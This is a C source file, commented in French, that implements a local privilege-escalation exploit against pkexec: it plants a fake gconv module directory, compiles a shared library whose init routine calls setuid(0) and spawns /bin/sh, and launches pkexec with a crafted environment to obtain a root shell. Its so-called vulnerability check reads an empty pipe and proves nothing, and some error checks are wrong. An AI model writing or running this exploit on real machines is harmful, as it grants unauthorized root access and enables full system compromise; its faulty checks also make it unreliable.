#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/wait.h>

struct stat st;
int pipefd[2];
char buf[99999];
void compileExploit() {
  // Créer le fichier exploit/exploit.c et y écrire le programme en C qui tente
  // de prendre les privilèges du superutilisateur (root) en appelant setuid() et setgid().
  FILE * fp;
  fp = fopen("exploit/exploit.c", "w");
  if (fp < 0) {
    perror("fopen");
    exit(0);
  }

  char * shell =
    "#include <stdio.h>\n"
  "#include <stdlib.h>\n"
  "#include <unistd.h>\n"
  "void gconv() {}\n"
  "void gconv_init() {\n"
  "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
  "  static char *a_argv[] = { \"sh\", NULL };\n"
  "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
  "  execve(\"/bin/sh\", a_argv, a_envp);\n"
  "  exit(0);\n"
  "}\n";

  fprintf(fp, "%s", shell);
  fclose(fp);

  // Compiler le fichier exploit/exploit.c en un bibliothèque partagée (.so)
  // en utilisant la commande gcc.
  system("gcc exploit/exploit.c -o exploit/exploit.so -shared -fPIC");
}

void gconvpath() {
  // Vérifier si le répertoire GCONV_PATH=. existe.
  if (stat("GCONV_PATH=.", & st) < 0) {
    // Si le répertoire n'existe pas, le créer avec les permissions 0777
    // (lecture, écriture et exécution pour tous les utilisateurs).
    if (mkdir("GCONV_PATH=.", 0777) < 0) {
      perror("mkdir");
      exit(0);
    }
    // Créer le fichier exploit dans GCONV_PATH=.
    int fd = open("GCONV_PATH=./exploit", O_CREAT | O_RDWR, 0777);
    if (fd < 0) {
      perror("open");
      exit(0);
    }
    close(fd);
  }
}

void iconv_open() {
  // Vérifier si le répertoire exploit existe.
  if (stat("exploit", & st) < 0) {
    // Si le répertoire n'existe pas, le créer avec les permissions 0777
    // (lecture, écriture et exécution pour tous les utilisateurs)
    if (mkdir("exploit", 0777) < 0) {
      perror("mkdir");
      exit(0);
    }

    // Créer le fichier exploit/gconv-modules et y écrire une chaîne de
    // caractères indiquant au système que le bibliothèque partagée
    // exploit.so est un module de conversion de caractères appelé exploit
    // compatible avec le jeu de caractères UTF-8 et NOT_UTF8.

    FILE * fp = fopen("exploit/gconv-modules", "wb");
    if (fp == NULL) {
      perror("fopen");
      exit(0);
    }
    fprintf(fp, "module UTF-8// NOT_UTF8// exploit 2\n");
    fclose(fp);
  }
}

void checkVulnerability() {
  // Créer un pipe pour échanger des données entre le processus parent et le processus enfant.
  pipe(pipefd);
  // Processus enfant
  if (fork() == 0) {
    // Fermer l'extrémité d'écriture du pipe.
    close(pipefd[1]);
    // Lire les données du pipe dans le tampon buf.
    read(pipefd[0], buf, sizeof(buf) - 1);
    // Fermer l'extrémité de lecture du pipe.
    close(pipefd[0]);

    // Si la chaîne de caractères "pkexec --version" est présente au début
    // du tampon buf, cela signifie que le système n'est pas vulnérable à l'exploit.
    if (strstr(buf, "pkexec --version") == buf) {
      puts("System is not vulnerable");
      exit(0);

      // Sinon, cela signifie que le système est vulnérable à l'exploit.
    } else {
      puts("System vulnerable");
    }
    // Fin du processus Enfant
    exit(0);
  }

  wait(0);
  close(pipefd[0]);
  close(pipefd[1]);
}

int main(int argc, char * argv[]) {
  // Créer un pointeur de fichier pour écrire dans le fichier exploit.c
  FILE * fp;

  char * a_argv[] = {
    NULL
  };
  char * a_envp[] = {
    "exploit",
    "PATH=GCONV_PATH=.",
    "CHARSET=NOT_UTF8",
    "SHELL=not/in/etc/shells",
    NULL
  };

  gconvpath();

  iconv_open();

  compileExploit();

  checkVulnerability();

  // Si le système est vulnérable à l'exploit, exécuter pkexec en utilisant les
  // arguments a_argv et les variables d'environnement a_envp.
  execve("/usr/bin/pkexec", a_argv, a_envp);
}